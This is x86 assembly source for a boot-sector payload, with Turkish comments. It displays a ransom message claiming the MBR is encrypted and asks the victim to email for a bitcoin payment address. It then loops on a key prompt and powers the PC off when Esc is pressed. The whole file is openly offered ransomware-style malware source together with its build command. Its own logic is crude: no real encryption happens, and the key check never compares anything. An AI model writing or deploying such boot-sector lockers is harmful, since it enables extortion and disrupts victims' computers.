[bits 16]
[org 0x7c00]
section .text
	global main
main:
	call video
	mov si,msg
	call print
	; bosluklari kirmiziya boya
	mov ah,06h
	mov bh,43h
	mov ch,0 ; satir
	mov cl,0x1c ; satirdaki karakter
	mov dh,0
	mov dl,0x4f
	int 10h
	mov ch,1
	mov cl,0x34
	mov dh,1
	int 10h
	mov ch,2
	mov dh,2
	mov cl,0x15
	int 10h
	mov dh,4
	mov ch,4
	mov cl,0x29
	int 10h
	mov ch,5
	mov cl,0x15
	mov dh,5
	int 10h
parola:
	mov si,ktext
	call print
	xor cx,cx
	call read
	cmp byte [uygunmu],1
	je arti
	mov si,gecemedin
	call print
	jmp parola
arti:
	mov si,gectin
	call print
	ret

video:
	mov ah,0x00
	mov al,03h
	int 10h
	mov ah,02h
	mov dl,0 ; column
	mov dh,0 ; row
	mov bh,0
	int 10h
	ret

read:
	mov ah,0x00
	int 16h
	mov ah,0xe
	cmp al,0xd
	je readend
	cmp al,0x1b
	je shut
	int 10h
	inc cx
	cmp cx, [klen]
	jg fazlauzun
	jmp read
	readend:
	mov ah,0xe
	mov al,10
	int 10h
	mov al,13
	int 10h
	ret

uymadi:
	mov byte [uygunmu],0
	jmp read

fazlauzun:
	mov si,uzun
	call print
	mov byte [uygunmu],0
	ret

print:
	mov ah,0xe
	printloop:
		mov al,[si]
		cmp al,0
		je printloopend
		int 10h
		inc si
		jmp printloop
	printloopend:
	ret



shut:
    mov ax, 0x1000
    mov ax, ss
    mov sp, 0xf000
    mov ax, 0x5307
    mov bx, 0x0001
    mov cx, 0x0003
    int 0x15




ktext db "Key: ",0
klen db 50
uygunmu db 0
uzun db 10,13,"cok uzun",10,13,0
gectin db "gectin...",0
gecemedin db "wrong key!",10,13,0
tuslar db 0
msg db "your mrb has been encrypted!",10,13,"Your custom serial key is: <serial key>",10,13,"quest: what can i do?",10,13,"answer: when you contact test@test.test then we send address of btc payment. if press esc, pc will shutdown.",10,13,"        - good luck -",10,13,0
times 510 - ($-$$) db 0
dw 0xaa55
;nasm -f bin -o payload.bin mrb-gg.asm
